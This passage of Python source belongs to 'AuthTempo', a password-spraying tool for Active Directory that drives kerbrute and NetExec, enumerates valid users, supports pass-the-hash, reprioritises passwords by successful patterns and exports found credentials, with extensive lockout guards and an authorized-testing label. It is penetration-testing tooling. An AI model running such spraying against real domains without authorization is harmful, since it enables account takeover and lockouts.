    """Stop the active child and persist state on terminal/process signals."""
    def handler(signum, frame):
        _stop_process(state.active_process)
        if ui is not None:
            ui.end_spray()
        console.print("\n[*] Interrupted. Saving state...", style="yellow")
        state.save()
        state.close()
        console.print("[*] State saved. You can resume with --resume.", style="green")
        sys.exit(128 + int(signum or signal.SIGINT))

    signals = [signal.SIGINT, signal.SIGTERM]
    if hasattr(signal, "SIGHUP"):
        signals.append(signal.SIGHUP)
    for sig in signals:
        signal.signal(sig, handler)

# =============================================================================
# Main run loop
# =============================================================================

def run(cfg: Config, console: Console) -> bool:
    """Main spray loop."""
    ui = RichUI(
        console,
        max_feed_lines=cfg.feed_lines,
        live_ui=cfg.live_ui,
        force_live=cfg.force_live_ui,
    )

    console.print(
        f"[*] Lockout guard: at most {cfg.lockout_burst} signal(s) per "
        f"secret/pass; signal {cfg.lockout_burst + 1} hard-stops the run.",
        style="cyan",
    )

    if cfg.passwords_per_round > 1:
        console.print(
            f"[!] Safety notice: --limit {cfg.passwords_per_round} gives each account "
            f"up to {cfg.passwords_per_round} attempts before the inter-batch delay. "
            "Confirm this is below the authorized domain lockout policy.",
            style="yellow",
        )

    # State schema v5 carries the exact effective identity set. It is restored
    # under the output-directory lock before any target activity, so a missing
    # convenience copy of active-users.txt cannot force re-enumeration.
    filtered_users_pending = False
    enumeration_safety_stop = False

    # Validate/create state and hold the run-directory lock before any network
    # activity, including preflight and optional identity enumeration.
    state = State(cfg.log_dir, cfg)
    setup_signal_handler(state, console, ui)
    if cfg.filter_disabled and state.identity_filter_complete and cfg.resume:
        # State is authoritative; refresh the convenience artifact even if a
        # stale or edited copy already exists.
        filtered_users_pending = True

    # Preflight
    try:
        ok, detail = preflight(cfg, ui, state)
    except Exception:
        state.close()
        raise
    if not ok:
        console.print(f"[!] Preflight failed: {detail}", style="red")
        console.print("[!] Aborting. Fix the issue or use --skip-target-check to bypass (not recommended).", style="yellow")
        console.print(
            "[*] Run state was retained; fix preflight and use --resume.",
            style="yellow",
        )
        state.close()
        return False

    # Feature 2: Filter disabled/non-existent accounts if requested
    if (
        cfg.filter_disabled
        and not cfg.dry_run
        and not state.identity_filter_complete
    ):
        original_count = len(cfg.users)
        enumeration_source_users = list(cfg.users)
        signals_before_enumeration = state.lockout_count
        try:
            enumerated_users = enumerate_valid_users(cfg, ui, console, state)
        except Exception:
            state.close()
            raise
        retained_keys = {
            canonical_identity(user, cfg.domain) for user in enumerated_users
        }
        retained_keys.update(
            canonical_identity(user, cfg.domain)
            for user in state.known_signal_users()
        )
        cfg.users = [
            user for user in enumeration_source_users
            if canonical_identity(user, cfg.domain) in retained_keys
        ]
        filtered_count = len(cfg.users)
        dropped = original_count - filtered_count

        state.set_effective_users(cfg.users)
        filtered_users_pending = True
        enumeration_safety_stop = (
            state.lockout_count > signals_before_enumeration
            or any(
                event.get("stage") == "identity_enumeration"
                for event in state.lockout_signals
            )
        )
        console.print(f"[*] Filtered: {filtered_count} valid of {original_count} total ({dropped} non-existent dropped)", style="green")

    if filtered_users_pending:
        active_users_file = state.log_dir / "active-users.txt"
        state._atomic_write_text(active_users_file, "\n".join(cfg.users) + "\n")
        console.print(f"[*] Active users saved to: {active_users_file}", style="cyan")
    ui.load_totals(
        state.credential_pairs(),
        state.admin_credential_pairs(),
        state.known_signal_users(),
        state.unknown_lockout_events,
        state.lockout_count,
        {
            (str(finding["user"]), str(finding["secret"])): str(
                finding.get("credential_state", "valid")
            )
            for finding in state.credentials
        },
    )

    if enumeration_safety_stop:
        message = (
            "Identity enumeration produced lockout/revocation safety evidence. "
            "The affected identities were quarantined and no password attempts "
            "were dispatched. Review the evidence before an explicit --resume."
        )
        console.print(f"[!] {message}", style="red")
        ui.alert("ENUMERATION SAFETY STOP", message, "red")
        state.record_timeline_event("stopped", "identity-enumeration safety signal")
        state.save()
        state.close()
        return False

    # Build failover chain
    chain = build_failover_chain(cfg)
    console.print(f"[*] Failover chain: {' -> '.join(str(e) for e in chain)}", style="cyan")

    # Prune failover-memory state for engines no longer in the chain (e.g. the
    # operator changed --tool/--protocol between runs). Keeps resume coherent.
    valid_keys = {str(e) for e in chain}
    stale = [k for k in state.engine_health if k not in valid_keys]
    if stale:
        for k in stale:
            del state.engine_health[k]
        console.print(f"[*] Pruned {len(stale)} stale engine-health entr(y|ies) not in chain: {', '.join(stale)}", style="dim")
    kerbrute_in_chain = any(e.tool == "kerbrute" for e in chain)
    if not kerbrute_in_chain:
        if state.known_bad_realms or state.working_realm:
            state.known_bad_realms = []
            state.working_realm = None
            console.print("[*] kerbrute no longer in chain; cleared realm-retry memory", style="dim")

    # Main loop over password queue
    window = SprayWindow(cfg.schedule) if cfg.schedule else None
    stop_reason = ""

    # A resumed run may already contain unacknowledged lockouts. Do not spray
    # another password until the operator explicitly accepts that state.
    existing_lockouts = state.lockout_count
    if (existing_lockouts >= cfg.lockout_threshold and
            existing_lockouts > state.acknowledged_lockouts):
        if handle_lockouts(
            0, existing_lockouts, cfg, ui, console, state.acknowledged_lockouts
        ):
            state.acknowledged_lockouts = existing_lockouts
            state.save()
        else:
            stop_reason = "operator stopped at lockout threshold"

    # Preserve batch boundaries across interruption. A resume may finish only
    # the unused slots from the interrupted batch; it cannot silently gain a
    # fresh N-pass allowance. If the prior process died in the tiny gap after
    # its final pass was saved, close that batch now and anchor a full delay.
    if cfg.resume and state.remaining_queue and not stop_reason:
        resume_progress = state.current_batch_progress()
        if resume_progress == cfg.passwords_per_round:
            state.mark_round_complete()
            state.record_timeline_event(
                "batch_end",
                "recovered completed batch boundary during resume",
                round_idx=state.completed_rounds,
            )
            state.save()
            resume_progress = 0

        if resume_progress == 0 and state.last_batch_completed_at:
            delay_seconds = int(
                cfg.time_between_rounds * 60 * state.delay_multiplier
            )
            completed_at = datetime.datetime.fromisoformat(
                state.last_batch_completed_at
            )
            elapsed_seconds = (
                datetime.datetime.now() - completed_at
            ).total_seconds()
            delay_remaining = max(0, math.ceil(delay_seconds - elapsed_seconds))
            if delay_remaining:
                console.print(
                    "[*] Resume is preserving the prior batch boundary: "
                    f"waiting {delay_remaining} second(s) before new passes.",
                    style="cyan",
                )
                state.record_timeline_event(
                    "resume_delay",
                    f"waited {delay_remaining} seconds for prior batch boundary",
                    round_idx=state.completed_rounds,
                )
                state.save()
                ui.countdown(delay_remaining)

    round_idx = state.completed_rounds

    while state.remaining_queue and not stop_reason:
        # Enforce the spray window before the first round and every later round.
        if window:
            wait_for_window(window, ui, console, state)

        # Take next batch
        # Leave the active batch in the persisted queue until each individual
        # secret is reconciled. A crash during the batch can then resume without
        # silently dropping the active or not-yet-started secrets.
        batch_progress = state.current_batch_progress()
        batch_capacity = cfg.passwords_per_round - batch_progress
        if batch_capacity <= 0:
            raise RuntimeError(
                "batch boundary was not finalized before dispatch; refusing to spray"
            )
        batch = state.remaining_queue[:batch_capacity]

        # Only cooldowns active before this round should tick at its end. A
        # demotion that happens during this round must retain its full N-round
        # cooldown for the N subsequent rounds.
        cooldowns_to_tick = {
            key for key, health in state.engine_health.items()
            if health.get("demoted") and health.get("cooldown_remaining", 0) > 0
        }

        console.print(
            f"\n[*] Batch {round_idx + 1}: evaluating {len(batch)} spray pass(es)",
            style="cyan",
        )

        # Compute effective chain for this round (engine health aware)
        effective_chain = state.compute_effective_chain(chain)

        # Check for tools whose retry delay has elapsed.
        for eng in chain:
            h = state.engine_health.get(str(eng))
            if h and h["demoted"] and h["cooldown_remaining"] == 0:
                console.print(
                    f"[*] Rechecking {eng} now that its retry delay has elapsed",
                    style="cyan",
                )
                detail = (
                    f"{eng}: rechecking after {state.cooldown_rounds} "
                    "password group(s)"
                )
                state.record_timeline_event("probe", detail, round_idx=round_idx + 1)

        # Show available and paused tools when useful.
        if cfg.verbose or any(state.engine_health.get(str(e), {}).get("demoted", False) for e in chain):
            available = [str(e) for e in effective_chain]
            paused = [
                str(e)
                for e in chain
                if state.engine_health.get(str(e), {}).get("demoted", False)
                and state.engine_health.get(str(e), {}).get("cooldown_remaining", 0) > 0
            ]
            parts = []
            if available:
                parts.append(f"available: {' → '.join(available)}")
            if paused:
                retry_details = [
                    f"{engine} (retry in "
                    f"{state.engine_health.get(engine, {}).get('cooldown_remaining', 0)} "
                    "group(s))"
                    for engine in paused
                ]
                parts.append(f"paused: {', '.join(retry_details)}")
            if parts:
                console.print(f"[*] Tool status — {'; '.join(parts)}", style="cyan")

        # Feature E: Record round start timeline event
        state.record_timeline_event("batch_start", "", round_idx=round_idx + 1)

        # Fixed batch description for the whole round. The active password is
        # shown separately on the "Current password" line, so this stays
        # constant for the round (it does NOT shrink as passwords are consumed).
        if len(batch) == 1:
            round_batch_info = f"Spraying 1 password: {batch[0]}"
        else:
            joined = ", ".join(batch)
            if len(joined) > 50:
                round_batch_info = f"Spraying {len(batch)} passwords: {joined[:47]}... ({len(batch)} total)"
            else:
                round_batch_info = f"Spraying {len(batch)} passwords: {joined}"
        round_lockout_users: Set[str] = set()
        round_unknown_lockouts = 0
        round_signal_events_this_round = 0
        round_ambiguous_lockouts: Set[str] = set()
        round_unknown_ambiguous_lockouts = 0
        round_conn_fails_this_round = 0  # Feature D: Track conn fails per round
        round_errors_this_round = []  # Track all errors in this round
        round_successes_this_round: Set[Tuple[str, str]] = set()
        processed_secrets: List[str] = []
        safety_stop = False
        safety_stop_kind = ""
        stopped_pass_signal_count = 0
        operator_stop = False

        for secret_idx, secret in enumerate(batch):
            state.current_pass = len(state.used_passwords) + 1
            engine_success = False
            explicit_probes_tried: Set[str] = set()

            # Enter retries the same secret. It is never marked used until one
            # engine actually finishes cleanly.
            while not engine_success and not safety_stop and not operator_stop:
                threshold_retry = False
                # Recompute per secret/retry so a just-demoted engine becomes
                # sticky at the back of the chain immediately.
                effective_chain = state.compute_effective_chain(chain)

                if not effective_chain:
                    probe = (
                        state.select_demoted_probe(chain, explicit_probes_tried)
                        if cfg.probe_demoted
                        else None
                    )
                    if probe is not None:
                        explicit_probes_tried.add(str(probe))
                        effective_chain = [probe]
                        console.print(
                            f"[!] Rechecking paused tool at operator request: {probe}",
                            style="yellow",
                        )
                        state.record_timeline_event(
                            "explicit_probe",
                            f"{probe}: operator requested --retry-paused-tools",
                            round_idx=round_idx + 1,
                        )
                    else:
                        operator_stop = True
                        stop_reason = "all tools are temporarily paused"
                        state.save()
                        console.print(
                            "[!] All tools are temporarily paused; stopping instead of "
                            "bypassing the retry delay. After troubleshooting, resume with "
                            "--retry-paused-tools to try each tool once.",
                            style="red",
                        )
                        break

                for engine in effective_chain:
                    ui.start_spray(engine, secret, round_idx + 1, round_batch_info)
                    state.record_spray_start(engine, secret, round_idx + 1)

                    try:
                        if engine.tool == "kerbrute" and cfg.realm_retry:
                            result = spray_kerbrute_with_realm_retry(engine, cfg, secret, ui, state)
                        else:
                            result = spray_one_password(engine, cfg, secret, ui, state)
                    finally:
                        # Always restore the cursor/terminal, including errors
                        # outside the engine subprocess wrapper and Ctrl-C paths.
                        ui.end_spray()

                    if not result.aborted and not result.reconciled_complete:
                        result.aborted = True
                        result.clean_finish = False
                        result.abort_reason = "unreconciled-output"
                        result.errors.append(
                            "engine returned without a reconciled completion contract"
                        )

                    round_lockout_users.update(result.lockouts)
                    round_lockout_users.update(result.ambiguous_lockouts)
                    round_signal_events_this_round += result.lockout_count
                    round_unknown_lockouts += (
                        result.unknown_lockouts + result.unknown_ambiguous_lockouts
                    )
                    round_ambiguous_lockouts.update(result.ambiguous_lockouts)
                    round_unknown_ambiguous_lockouts += result.unknown_ambiguous_lockouts
                    round_conn_fails_this_round += result.conn_fails
                    round_errors_this_round.extend(result.errors)
                    round_successes_this_round.update(result.successes)
                    state.record_spray_end(
                        len(result.successes),
                        result.lockout_count,
                        result.conn_fails,
                        result.aborted,
                        result.abort_reason,
                        len(result.errors),
                    )
                    if result.aborted and result.abort_reason in {
                        "lockout-burst", "lockout-safety-stop"
                    }:
                        # This is an operator-safety stop, not a reason to try a
                        # second engine. Requeue the partially attempted secret.
                        safety_stop = True
                        stopped_pass_signal_count = state.signal_count_for_secret(secret)
                        ambiguous_signal = bool(
                            result.ambiguous_lockouts
                            or result.unknown_ambiguous_lockouts
                        )
                        safety_stop_kind = (
                            "ambiguous-lockout-safety-stop"
                            if ambiguous_signal
                            else result.abort_reason
                        )
                        if result.abort_reason == "lockout-safety-stop":
                            stop_reason = (
                                "ambiguous lockout/revocation safety signal"
                                if ambiguous_signal
                                else "Kerbrute safe mode detected a locked account"
                            )
                        else:
                            stop_reason = "per-pass safety-signal maximum exceeded"
                        break

                    if result.aborted and result.abort_reason == "lockout-threshold":
                        cumulative_lockouts = state.lockout_count
                        pass_lockout_count = state.signal_count_for_secret(secret)
                        if pass_lockout_count > cfg.lockout_burst:
                            safety_stop = True
                            safety_stop_kind = "lockout-burst"
                            stopped_pass_signal_count = pass_lockout_count
                            stop_reason = "per-pass safety-signal maximum exceeded"
                        else:
                            should_continue = handle_lockouts(
                                pass_lockout_count,
                                cumulative_lockouts,
                                cfg,
                                ui,
                                console,
                                state.acknowledged_lockouts,
                            )
                            if should_continue:
                                state.acknowledged_lockouts = cumulative_lockouts
                                state.save()
                                threshold_retry = True
                            else:
                                operator_stop = True
                                stop_reason = "operator stopped at lockout threshold"
                        break

                    if result.aborted:
                        state.register_engine_failure(str(engine), result.abort_reason)
                        health = state.engine_health.get(str(engine), {})
                        if health.get("demoted"):
                            console.print(
                                f"[-] {engine}: {humanize_tool_issue(result.abort_reason)}; "
                                "paused for "
                                f"{health.get('cooldown_remaining', 0)} password group(s)",
                                style="yellow",
                            )
                        else:
                            console.print(
                                f"[-] {engine}: {humanize_tool_issue(result.abort_reason)} "
                                f"({health.get('consecutive_failures', 0)} of "
                                f"{state.transient_threshold} before pausing)",
                                style="yellow",
                            )
                        continue

                    if result.dispatches:
                        state.register_engine_success(str(engine))
                    engine_success = True
                    break

                if safety_stop or operator_stop:
                    break

                if threshold_retry:
                    # Resume this password only for users not already attempted;
                    # do not demote or fail over merely because safety paused it.
                    continue

                if not engine_success:
                    state.save()
                    console.print("[!] All engines failed for this secret. Pausing.", style="red")
                    ui.alert(
                        "ALL ENGINES FAILED",
                        "Could not spray this secret with any tool in the failover chain. "
                        "Check network/DC. Press Enter to retry or Ctrl-C to abort.",
                        "red",
                    )
                    input()

            if safety_stop or operator_stop:
                break

            pass_records = list(state.pair_ledger.get(secret, {}).values())
            pass_statuses: Dict[str, int] = {}
            for record in pass_records:
                status = str(record.get("status", "indeterminate"))
                pass_statuses[status] = pass_statuses.get(status, 0) + 1
            pass_dispatches = sum(
                max(0, int(record.get("dispatch_count", 0)))
                for record in pass_records
            )
            pass_valid = sum(
                pass_statuses.get(status, 0)
                for status in SUCCESS_PAIR_STATUSES
            )
            pass_failed = pass_statuses.get("auth_failure", 0)
            pass_safety = (
                pass_statuses.get("lockout", 0)
                + pass_statuses.get("ambiguous_lockout", 0)
            )
            pass_uncertain = (
                pass_statuses.get("indeterminate", 0)
                + pass_statuses.get("in_flight", 0)
            )
            state.record_timeline_event(
                "pass_complete",
                (
                    f"pass {state.current_pass}: {pass_dispatches} sent, "
                    f"{pass_valid} valid, {pass_failed} failed, "
                    f"{pass_safety} safety, {pass_uncertain} uncertain"
                ),
                round_idx=round_idx + 1,
            )
            state.mark_used(secret)
            processed_secrets.append(secret)

            # Stop before the next secret if this pass exceeded its ceiling.
            pass_lockout_count = state.signal_count_for_secret(secret)
            if pass_lockout_count > cfg.lockout_burst:
                safety_stop = True
                safety_stop_kind = "lockout-burst"
                stopped_pass_signal_count = pass_lockout_count
                stop_reason = "per-pass safety-signal maximum exceeded"
                break

            cumulative_lockouts = state.lockout_count
            if (cumulative_lockouts >= cfg.lockout_threshold and
                    cumulative_lockouts > state.acknowledged_lockouts):
                should_continue = handle_lockouts(
                    pass_lockout_count,
                    cumulative_lockouts,
                    cfg,
                    ui,
                    console,
                    state.acknowledged_lockouts,
                )
                if should_continue:
                    state.acknowledged_lockouts = cumulative_lockouts
                    state.save()
                else:
                    operator_stop = True
                    stop_reason = "operator stopped at lockout threshold"
                    break

        round_lockouts_this_round = round_signal_events_this_round

        if safety_stop:
            if safety_stop_kind == "lockout-safety-stop":
                msg = (
                    "[!] Hard-stop: Kerbrute safe mode detected a locked-out "
                    "account and stopped before attempting the remaining users."
                )
                alert_title = "LOCKOUT DETECTED - STOPPED"
            elif safety_stop_kind == "ambiguous-lockout-safety-stop":
                msg = (
                    "[!] Hard-stop: the engine reported an ambiguous lockout/revocation "
                    "signal. The identity was quarantined without labeling it confirmed."
                )
                alert_title = "AMBIGUOUS SAFETY SIGNAL - STOPPED"
            else:
                msg = (
                    f"[!] Hard-stop: {stopped_pass_signal_count} lockout signals in this "
                    f"spray pass exceeded the maximum of {cfg.lockout_burst}."
                )
                alert_title = "LOCKOUT LIMIT - STOPPED"
            console.print(msg, style="red")
            ui.alert(alert_title, msg, "red")

        # Feature 3: Pattern learning - re-prioritize queue based on successful patterns
        boosted = 0 if (safety_stop or operator_stop) else state.reprioritize_queue()
        if boosted > 0:
            # Get top successful patterns
            top_patterns = sorted(state.success_by_pattern.items(), key=lambda x: x[1], reverse=True)[:3]
            pattern_names = [pat for pat, _ in top_patterns]
            console.print(f"[*] Re-prioritizing: boosting {boosted} password(s) matching successful pattern(s): {', '.join(pattern_names)}", style="cyan")
            # Feature E: Record reprioritize timeline event
            state.record_timeline_event("reprioritize", f"boosted {boosted} passwords", round_idx=round_idx + 1)

        # Show round summary
        round_label = "stopped" if (safety_stop or operator_stop) else "complete"
        console.print(f"[*] Batch {round_idx + 1} {round_label}:", style="cyan")
        lockout_detail = f"{round_lockouts_this_round}"
        if round_lockout_users:
            lockout_detail += f" ({len(round_lockout_users)} affected identity/identities)"
        if round_unknown_lockouts:
            lockout_detail += f" ({round_unknown_lockouts} unknown-user signal(s))"
        ambiguous_count = len(round_ambiguous_lockouts) + round_unknown_ambiguous_lockouts
        if ambiguous_count:
            lockout_detail += f" ({ambiguous_count} ambiguous)"
        console.print(f"    - Safety signals: {lockout_detail}", style="yellow" if round_lockouts_this_round > 0 else "dim")
        console.print(f"    - Found credentials: {len(round_successes_this_round)}", style="green" if round_successes_this_round else "dim")

        # Feature 4: Show compact stats line
        console.print(f"    - {state.get_compact_stats()}", style="cyan")

        # Show last password sprayed and next passwords to spray
        if processed_secrets:
            last_pw = processed_secrets[-1]
            console.print(f"    - Last password sprayed: {escape(last_pw)}", style="cyan")
        else:
            console.print("    - Last password sprayed: (none)", style="dim")

        next_passwords_preview = state.remaining_queue[:cfg.passwords_per_round]
        if next_passwords_preview:
            next_list_str = ", ".join(next_passwords_preview)
            console.print(f"    - Next password(s) to spray: {escape(next_list_str)}", style="cyan")
        else:
            console.print("    - Next password(s) to spray: <end of file>", style="dim")

        # Show error messages if any
        if round_errors_this_round:
            console.print(f"    - Errors: {len(round_errors_this_round)}", style="red")
            console.print("      Error messages:", style="red")
            for err in round_errors_this_round[:5]:  # Show first 5 errors
                console.print(f"        - {escape(str(err))}", style="dim")

        # Show connection errors (informational - doesn't pause unless all engines fail)
        if round_conn_fails_this_round > 0:
            console.print(f"    - Connection errors: {round_conn_fails_this_round} (informational - some engines may have issues but at least one succeeded)", style="cyan")

        # Show tool availability if any tool is temporarily paused.
        if any(state.engine_health.get(str(e), {}).get("demoted", False) for e in chain):
            console.print("    - Tool status:")
            for eng in chain:
                h = state.engine_health.get(str(eng), {})
                if not h:
                    status = "available"
                    detail = ""
                elif h["demoted"]:
                    status = "paused"
                    detail = (
                        f"retry after {h['cooldown_remaining']} password group(s); "
                        f"last issue: {humanize_tool_issue(str(h.get('last_reason', '')))}"
                    )
                else:
                    status = "available"
                    detail = ""
                console.print(f"      {eng}: {status}" + (f" ({detail})" if detail else ""), style="yellow" if h.get("demoted") else "green")

        # A round is complete only if every secret in its batch finished.
        if len(processed_secrets) == len(batch):
            state.mark_round_complete()
            state.record_timeline_event(
                "batch_end",
                f"batch {round_idx + 1} complete",
                round_idx=round_idx + 1,
            )

        if safety_stop or operator_stop:
            state.save()
            break

        # Tick cooldowns for demoted engines at batch end before the next batch.
        state.tick_cooldowns(cooldowns_to_tick)

        # Check for critical errors that should prevent countdown
        # (No longer pause - just informational + let failover/demotion handle it)
        critical_errors = [e for e in round_errors_this_round if any(kw in e.lower() for kw in ["wrong realm", "cannot find kdc", "no kdc", "unknown realm"])]
        if critical_errors:
            console.print(
                f"[*] {len(critical_errors)} realm/domain error(s) this batch — "
                "handled through automatic domain retry and tool failover",
                style="cyan",
            )
            state.record_timeline_event("realm_error", f"{len(critical_errors)} realm/domain errors", round_idx=round_idx + 1)

        # Feature D: Update throttle based on this round's conn fails
        throttle_mult = state.update_throttle(round_conn_fails_this_round)
        if throttle_mult > 1.0:
            console.print(f"    [*] Throttling: {throttle_mult:.1f}x inter-batch delay (DC stress detected)", style="yellow")
            # Feature E: Record throttle timeline event
            state.record_timeline_event("throttle", f"multiplier now {throttle_mult:.1f}x", round_idx=round_idx + 1)

        # Countdown if more passwords remain
        if state.remaining_queue:
            # Feature D: Apply throttle multiplier to delay
            effective_delay_seconds = math.ceil(
                cfg.time_between_rounds * 60 * state.delay_multiplier
            )
            console.print(
                f"[*] Waiting {effective_delay_seconds} second(s) until next batch...",
                style="cyan",
            )
            ui.countdown(effective_delay_seconds)

        state.save()
        round_idx += 1

    # Done (or safely stopped with resumable work remaining).
    if stop_reason:
        console.print(f"\n[!] Spray stopped: {stop_reason}. Resume with --resume.", style="yellow")
        state.record_timeline_event("stopped", stop_reason)
    else:
        console.print("\n[+] Spray complete.", style="green")
        if not any(
            event.get("type") == "complete"
            for event in state.timeline_events
        ):
            state.record_timeline_event("complete", "spray finished")
    console.print(f"[+] Found credentials: {state.credential_count}", style="green")
    ready_findings = [
        finding
        for finding in state.credentials
        if finding.get("credential_state", "valid") == "valid"
    ]
    if ready_findings:
        console.print("[+] Credential findings:", style="green bold")
        for finding in ready_findings:
            marker = "★ ADMIN" if finding.get("is_admin") else "✓"
            source = finding.get("engine") or "unknown engine"
            source_pass = (
                finding.get("source_pass")
                or finding.get("source_round")
                or "?"
            )
            console.print(
                f"    {marker} {escape(str(finding['user']))}:"
                f"{escape(str(finding['secret']))} "
                f"[dim]({escape(str(source))}, pass {escape(str(source_pass))})[/dim]",
                style="red bold" if finding.get("is_admin") else "green",
            )
    password_change_findings = state.password_change_findings()
    if password_change_findings:
        console.print(
            "[!] Valid credentials requiring a password change:",
            style="magenta bold",
        )
        for finding in password_change_findings:
            source = finding.get("engine") or "unknown engine"
            state_label = credential_state_label(
                str(finding["credential_state"])
            )
            console.print(
                f"    ↻ {escape(str(finding['user']))}:"
                f"{escape(str(finding['secret']))} — {escape(state_label)} "
                f"[dim]({escape(str(source))})[/dim]",
                style="magenta bold",
            )
            console.print(
                f"      Change it: {escape(state.password_change_command(finding))}",
                style="magenta",
            )
    console.print(f"[+] Total safety signals: {state.lockout_count}", style="yellow")
    state.save()

    # Feature 4: Show full stats dashboard
    console.print("\n")
    console.print(state.render_stats(console))

    # Timeline JSON is always retained as an audit trail; credential exports
    # follow the explicit --export selection.
    console.print("\n[*] Writing audit artifacts...", style="cyan")

    # Export timeline.json (always)
    timeline_json = state.log_dir / "timeline.json"
    state._atomic_write_text(timeline_json, json.dumps(state.timeline_events, indent=2) + "\n")
    console.print(f"[+] Timeline exported to: {timeline_json}", style="cyan")

    # Export HTML timeline if --timeline set
    if cfg.timeline or cfg.export == "all":
        timeline_html = state.log_dir / TIMELINE_HTML_NAME
        state._atomic_write_text(timeline_html, state.render_timeline_html())
        console.print(f"[+] Timeline HTML exported to: {timeline_html}", style="cyan")

    if cfg.export in ("json", "all"):
        state.export_results("json")
        console.print(f"[+] JSON results exported to: {state.log_dir}/results.json", style="green")
    if cfg.export in ("csv", "all"):
        state.export_results("csv")
        console.print(f"[+] CSV results exported to: {state.log_dir}/results.csv", style="green")

    console.print(f"[+] Credentials saved to: {state.creds_file}", style="cyan")
    if password_change_findings:
        console.print(
            f"[+] Password-change commands saved to: {state.password_changes_file}",
            style="magenta",
        )
    console.print(f"[+] Lockouts saved to: {state.lockouts_file}", style="cyan")
    console.print(f"[+] Overall log: {state.overall_log}", style="cyan")
    completed = not state.remaining_queue and not stop_reason
    state.close()
    return completed

# =============================================================================
# CLI entrypoint
# =============================================================================

def read_input_lines(path: str, *, identities: bool, domain: str = "") -> List[str]:
    """Read ordered unique identities or literal secrets with explicit escaping."""
    values: List[str] = []
    seen: Set[str] = set()
    with open(path, "r", encoding="utf-8") as handle:
        for line_number, source_line in enumerate(handle, 1):
            value = source_line.rstrip("\r\n")
            if not value:
                continue
            if value.startswith(r"\#"):
                value = value[1:]
            elif value.startswith("#") or (identities and value.lstrip().startswith("#")):
                continue

            if identities:
                value = value.strip()
                if not value:
                    continue
                if any(ord(char) < 32 for char in value):
                    raise ValueError(
                        f"unsupported control character in identity {path}:{line_number}"
                    )
                unique_key = canonical_identity(value, domain)
            else:
                # Secret whitespace is significant. Reject control characters
                # other than the newline already removed above.
                if any(ord(char) < 32 and char != "\t" for char in value):
                    raise ValueError(
                        f"unsupported control character in {path}:{line_number}"
                    )
                unique_key = value

            if unique_key in seen:
                continue
            seen.add(unique_key)
            values.append(value)
    return values

class _AdvancedHelpAction(argparse.Action):
    """Show the expanded parser without requiring target arguments."""

    def __init__(self, option_strings, dest, **kwargs):
        super().__init__(option_strings, dest, nargs=0, **kwargs)

    def __call__(self, parser, namespace, values, option_string=None):
        build_argument_parser(parser.prog, advanced=True).print_help()
        parser.exit()


def build_argument_parser(invoked_program: str, advanced: bool = False) -> argparse.ArgumentParser:
    """Build the compact operator CLI or the complete advanced reference."""
    advanced_help = None if advanced else argparse.SUPPRESS
    if advanced:
        description = (
            f"{PRODUCT_NAME} — complete option reference for authorized assessments. "
            "The defaults are intentionally conservative; most runs do not need these controls."
        )
        epilog = """
Older option names remain accepted for script compatibility but are intentionally
omitted here. Run authtempo --help for the short, everyday interface.
        """
    else:
        description = (
            f"{PRODUCT_NAME} — safety-first password auditing for authorized environments. "
            "Safe defaults work without tuning."
        )
        epilog = """
Examples:
  authtempo -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10
  authtempo -u users.txt -p passwords.txt -d LAB -dc-ip 10.10.10.10 --dry-run

Use --advanced-help for schedules, recovery tuning, display, and troubleshooting.
For authorized penetration testing only.
        """

    parser = argparse.ArgumentParser(
        prog=invoked_program,
        description=description,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=epilog,
    )

    required = parser.add_argument_group("required inputs")
    required.add_argument("-u", "--users", metavar="FILE", dest="u", help="Usernames, one per line", required=True)
    required.add_argument("-p", "--passwords", metavar="FILE", dest="p", help="Passwords, one per line", required=True)
    required.add_argument("-d", "--domain", metavar="DOMAIN", dest="d", help="Active Directory domain", required=True)
    required.add_argument("-dc-ip", "--dc", metavar="IP", dest="dc_ip", help="Domain controller IP address", required=True)

    everyday = parser.add_argument_group("everyday controls")
    everyday.add_argument("--tool", choices=["kerbrute", "nxc"], default="kerbrute", help="Tool to try first; failover is automatic (default: kerbrute)")
    everyday.add_argument("--protocol", choices=["smb", "ldap"], default="ldap", help="NetExec protocol (default: ldap; ignored by Kerbrute)")
    everyday.add_argument("-t", "--wait", metavar="MINUTES", type=int, default=35, dest="t", help="Wait between password groups (default: 35 minutes)")
    everyday.add_argument("--limit", metavar="N", type=int, default=1, dest="passwords_per_round", help="Passwords tested across the user list before each wait (default: 1)")
    everyday.add_argument(
        "--max-lockouts",
        dest="lockout_burst",
        metavar="N",
        type=int,
        default=3,
        help="Hard-stop when one password produces more than N lockout signals (default: 3)",
    )
    everyday.add_argument("--validate-users", dest="filter_disabled", action="store_true", help="Check which usernames exist before testing passwords")
    everyday.add_argument("--pth", action="store_true", help="Treat the password file as NTLM hashes (uses NetExec)")

    run_control = parser.add_argument_group("run control")
    state_mode = run_control.add_mutually_exclusive_group()
    state_mode.add_argument("--resume", action="store_true", help="Continue a compatible interrupted run")
    state_mode.add_argument("--start-fresh", action="store_true", help="Replace AuthTempo files in the output directory and start over")
    run_control.add_argument("--dry-run", action="store_true", help="Simulate tool output; sends no authentication attempts")
    run_control.add_argument("-o", "--output", metavar="DIR", dest="log_dir", default=None, help="State, logs, and findings directory")

    reports = parser.add_argument_group("reports")
    reports.add_argument("--report", choices=["json", "csv", "all"], dest="export", default="none", help="Write JSON, CSV, or both result reports")
    reports.add_argument("--timeline", action="store_true", help=f"Write the {TIMELINE_HTML_NAME} activity view")

    parser.add_argument("--advanced-help", action=_AdvancedHelpAction, help="Show scheduling, recovery, display, and troubleshooting options")

    safety = parser.add_argument_group("advanced safety and recovery")
    safety.add_argument(
        "--review-after-lockouts",
        metavar="N",
        dest="lockout_threshold",
        type=int,
        default=2,
        help=advanced_help or "Pause for operator review after N total lockout signals (default: 2)",
    )
    safety.add_argument(
        "--tool-retry-after",
        metavar="GROUPS",
        dest="engine_cooldown",
        type=int,
        default=3,
        help=advanced_help or "Retry a paused tool after N completed password groups (default: 3)",
    )
    safety.add_argument(
        "--tool-error-limit",
        metavar="N",
        dest="engine_fail_threshold",
        type=int,
        default=2,
        help=advanced_help or "Pause a tool after N consecutive temporary errors (default: 2)",
    )
    safety.add_argument(
        "--retry-paused-tools",
        dest="probe_demoted",
        action="store_true",
        help=advanced_help or "If every tool is paused, try each one once instead of stopping",
    )
    safety.add_argument(
        "--tool-timeout",
        metavar="SECONDS",
        dest="engine_timeout",
        type=int,
        default=300,
        help=advanced_help or "Stop one tool invocation after this total time (default: 300 seconds)",
    )
    safety.add_argument(
        "--tool-silence-timeout",
        metavar="SECONDS",
        dest="engine_idle_timeout",
        type=int,
        default=60,
